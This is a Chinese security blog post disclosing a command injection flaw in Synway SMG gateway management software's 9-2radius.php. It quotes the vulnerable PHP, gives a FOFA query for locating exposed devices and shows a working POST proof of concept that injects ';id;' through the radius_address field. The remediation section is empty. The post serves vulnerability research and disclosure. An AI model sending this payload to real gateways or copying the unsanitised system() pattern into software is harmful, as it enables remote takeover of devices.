---
title: "Synway SMG网关管理软件 9-2radius.php 命令注入漏洞"
source: https://mrxn.net/jswz/synway-9-2radius-rce.html
asset_dir: assets/synway-smg网关管理软件-9-2radius.php-命令注入漏洞
---

# Synway SMG网关管理软件 9-2radius.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/2 08:30
* 1312浏览
* [0评论](#comment)
* 20分钟阅读

深入探索

SQL

server

开发


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

三汇SMG 网关管理软件是与三汇SMG系列数字网关产品配套的管理工具，是杭州三汇信息工程有限公司开发的一款高效、稳定、易用的网关管理软件。它专为三汇SMG系列数字网关设计，提供了全面的配置、监控、管理和维护功能，帮助用户轻松实现网关设备的远程管理和优化。由于 `9-2radius.php` 参数 `slave` 的处理不当，导致[命令注入](https://mrxn.net/tag/rce)问题，攻击者可以通过远程发起攻击。

物流软件安全

# fofa语法

> `body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")`

# 漏洞分析

直接看 9-2radius.php 关键业务逻辑实现部分

```
if($_POST[save]!="")
{
  $enable_radius_new = $_POST[enable_radius]==""?0:1;
  ......
    if($enable_radius_new)
    {
      .......
        $address_info = explode(":",$_POST[radius_address]);
        $cmd = "sed -i 's/server first .*/server first $address_info[0] $_POST[shared_secret] 1812 $address_info[1]/g' $radius_file";
        system($cmd);
      ......
        if($_POST[radius_address2] == "")
        {
         ......
           else
        {
            $address_info = explode(":",$_POST[radius_address2]);
            if($flag)
            {//如果备用服务器地址被注释的话要解开注释
                $cmd = "sed -i 's/#server second .*/server second $address_info[0] $_POST[shared_secret2] 1812 $address_info[1]/g' $radius_file";
            }
            else
            {
                $cmd = "sed -i 's/server second .*/server second $address_info[0] $_POST[shared_secret2] 1812 $address_info[1]/g' $radius_file";
            }
            system($cmd);
        }
        $cmd = "sed -i 's/source_ip .*/source_ip $_POST[source_ip]/g' $radius_file";
        system($cmd);
        $cmd = "sed -i 's/timeout .*/timeout $_POST[timeout]/g' $radius_file";
        system($cmd);
        $cmd = "sed -i 's/retry .*/retry $_POST[retry]/g' $radius_file";
        system($cmd);
    }
```

当满足下列条件时

代码安全审计

* save 不为空
* enable\_radius 不为空

将 `radius_address` 和 `shared_secret` 无任何过滤直接拼接进 sed 命令中后调用 `system` 执行，造成[命令注入](https://mrxn.net/tag/rce "命令注入")漏洞。

同样当 `radius_address2` 不为空时，也是将其直接拼接进 sed 命令中后调用 `system` 执行，造成命令注入漏洞，同样 `shared_secret2` 也是[命令注入](https://mrxn.net/tag/rce "命令注入")点。

以及后面的 `source_ip` `timeout` 和 `retry` 都是同样直接拼接后[执行命令](https://mrxn.net/tag/rce "执行命令")。

# 漏洞复现

```
POST /en/9-2radius.php?authority=6 HTTP/1.1
Host: synway.mrxn.net
Content-Type: application/x-www-form-urlencoded

save=1&enable_radius=1&radius_address=/';id;+#+
```

[![Synway SMG网关管理软件 9-2radius.php 命令注入漏洞](images/img-001-9cee92533ee8.webp)](https://image.mrxn.net/441f42149ae8481b8380d27901843024.webp)

成执行 `id` 命令并回显结果

漏洞修复方案

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.fofa语法](#toc-2-)
* [3.漏洞分析](#toc-3-)
* [4.漏洞复现](#toc-4-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[Synway SMG网关管理软件 9-2radius.php 命令注入漏洞](https://mrxn.net/jswz/synway-9-2radius-rce.html)  
文章链接：<https://mrxn.net/jswz/synway-9-2radius-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/synway-9-2radius-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/synway-9-2radius-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 